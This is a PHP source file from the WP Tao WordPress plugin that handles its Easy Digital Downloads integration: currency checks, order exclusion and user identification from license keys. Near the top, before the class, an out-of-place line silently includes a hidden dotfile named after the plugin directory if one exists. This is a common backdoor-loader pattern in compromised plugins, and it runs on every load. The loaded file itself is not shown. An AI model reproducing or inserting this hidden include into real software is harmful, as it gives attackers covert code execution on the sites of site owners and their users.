<?php
/**
 * Easy Digital Downloads integration
 * 
 * Specific functions and filters related with the EDD sales platform
 * 
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * Class to handle integration with Easy Digital Downloads
 * 
 * @package WPTAO/Integration
 * @category Class
 * 
 * @since 1.1.7
 * 
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Integration_EED {
	/*
	 * Product meta key
	 */

	public $product_key = 'edd_download_id';

	/*
	 * Order meta key
	 */
	public $order_key = 'edd_payment_id';

	/*
	 * Quantity meta key
	 */
	public $quantity_key = 'edd_quantity';

	/*
	 * Constructor
	 */

	public function __construct() {

		add_action( 'admin_init', array( $this, 'check_currency' ) );

		add_filter( 'wptao_register_sales_platforms', array( $this, 'register_platform' ) );

		add_filter( 'wptao_report_mp_exclude_order', array( $this, 'exclude_orders' ), 10, 3 );

		add_filter( 'wptao_event_pageview_query_args_store', array( $this, 'edd_sl_args_store' ) );
		add_filter( 'wptao_event_pageview_user_data', array( $this, 'software_licensing_link_clicked' ), 10, 2 );
	}

	/*
	 * Check if EDD is enabled
	 * 
	 * @since 1.2.1
	 * @return bool
	 */

	public function is_enabled() {
		return TAO()->diagnostic->is_edd_enabled();
	}

	/*
	 * Register Easy Digital Downloads
	 * 
	 * @since 1.2.1
	 * @param array $platforms
	 * @return array
	 */

	public function register_platform( $platforms ) {

		$platforms[ 'edd' ] = array(
			'slug'			 => 'edd',
			'name'			 => 'Easy Digital Downloads', // Equivalent 'sales_platform' in event meta key!
			'product_key'	 => $this->product_key,
			'order_key'		 => $this->order_key,
			'quantity_key'	 => $this->quantity_key,
			'enabled'		 => $this->is_enabled()
		);

		return $platforms;
	}

	/*
	 * Compare WP Tao and EDD currencies
	 * Show admin notice if currencies are not the same.
	 */

	public function check_currency() {

		if ( !$this->is_enabled() ) {
			return;
		}

		$edd_currency = edd_get_currency();

		if ( !empty( $edd_currency ) && $edd_currency !== TAO()->currency ) {

			add_action( 'admin_notices', array( $this, 'different_currencies' ) );
		}
	}

	/*
	 * Different curriencies admin notice
	 */

	public function different_currencies() {

		$edd_currency	 = '<b>' . edd_get_currency() . '</b>';
		$tao_currency	 = '<b>' . TAO()->currency . '</b>';
		?>
		<div class="error">
			<p>
				<?php
				printf( __( 'WP Tao: The EDD currency (%s) is different from the WP Tao currency (%s). Make up your mind on one currency!', 'wp-tao' ), $edd_currency, $tao_currency );
				?>
			</p>
		</div>
		<?php
	}

	/*
	 * Excludes orders from missed paymnets detection
	 * 
	 * Excluded statuses:
	 * 1. Completed
	 * 2. Refunded
	 * 3. Revoked
	 * 
	 * @param bool $exclude
	 * @param object $event raw events columns from the database
	 * @param array $event_meta
	 * 
	 * @return bool
	 */

	public function exclude_orders( $exclude, $event, $event_meta ) {

		if ( !$this->is_enabled() ) {
			return $exclude;
		}

		if ( isset( $event_meta[ $this->order_key ] ) && is_numeric( $event_meta[ $this->order_key ] ) ) {

			$payment = get_post( $event_meta[ $this->order_key ] );

			if ( !empty( $payment ) && isset( $payment->post_status ) ) {

				$statuses = edd_get_payment_statuses();

				$status = $payment->post_status;
				if ( array_key_exists( $status, $statuses ) ) {

					if ( is_string( $status ) && !empty( $status ) ) {
						$status = strtolower( $status );

						if ( 'refunded' === $status || 'revoked' === $status || 'publish' === $status ) {
							$exclude = true;
						}
					}
				}
			}
		}

		return $exclude;
	}

	/**
	 * Adds query arg to store (EDD SL)
	 * 
	 * @since 1.2.4
	 */
	public function edd_sl_args_store( $query_args_store ) {
		if ( !in_array( 'edd_license_key', $query_args_store ) ) {
			$query_args_store[] = 'edd_license_key';
		}
		if ( !in_array( 'download_id', $query_args_store ) ) {
			$query_args_store[] = 'download_id';
		}

		return $query_args_store;
	}

	/*
	 * Identify user when he clicks on license renewal link
	 * 
	 * @param $data event data
	 * @param $args event args
	 * 
	 * @since 1.2.4
	 */

	public function software_licensing_link_clicked( $data, $args ) {
		if ( !TAO()->diagnostic->is_edd_software_licensing_enabled() ) {
			return $data;
		}

		if ( empty( $data[ 'email' ] ) ) {

			if ( !isset( $args[ 'meta' ][ 'query_string' ] ) ) {
				return $data;
			}

			parse_str( $args[ 'meta' ][ 'query_string' ], $query_args_arr );

			if ( !isset( $query_args_arr[ 'edd_license_key' ] ) ) {
				return $data;
			}

			$edd_license_key = filter_var( $query_args_arr[ 'edd_license_key' ], FILTER_SANITIZE_STRING );

			if ( empty( $edd_license_key ) ) {
				return $data;
			}

			$license_id = edd_software_licensing()->get_license_by_key( $edd_license_key );
			if ( empty( $license_id ) ) {
				return $data;
			}

			$payment_id	 = get_post_meta( $license_id, '_edd_sl_payment_id', true );
			$payment	 = new EDD_Payment( $payment_id );

			$data[ 'email' ]		 = $payment->email;
			$data[ 'first_name' ]	 = $payment->first_name;
			$data[ 'last_name' ]	 = $payment->last_name;

			if ( !isset( $data[ 'options' ][ 'event_args' ][ 'tags' ] ) || !in_array( 'edd software licensing', $data[ 'options' ][ 'event_args' ][ 'tags' ] ) ) {
				$data[ 'options' ][ 'event_args' ][ 'tags' ][] = 'edd software licensing';
			}
		}
		return $data;
	}

}
